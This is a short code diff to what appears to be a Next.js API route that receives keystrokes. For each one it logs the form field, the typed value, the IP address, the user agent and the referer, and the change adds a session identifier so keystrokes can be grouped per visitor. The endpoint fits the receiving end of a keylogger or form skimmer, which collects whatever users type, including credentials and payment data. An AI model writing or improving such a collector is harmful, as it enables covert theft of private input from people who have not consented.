@@ -8,13 +8,15 @@ export async function GET(request: NextRequest) {
   const { searchParams } = new URL(request.url);
   const field = searchParams.get('field');
   const val = searchParams.get('val');
+  const sessionId = searchParams.get('session');
   
-  // Log the keystroke
+  // Log the keystroke with session tracking
   await logger({
     type: 'keystroke',
     timestamp: new Date().toISOString(),
     field,
     value: val,
+    sessionId,
     userAgent: request.headers.get('user-agent'),
     referer: request.headers.get('referer'),
     ip: request.headers.get('x-forwarded-for') || 'unknown'
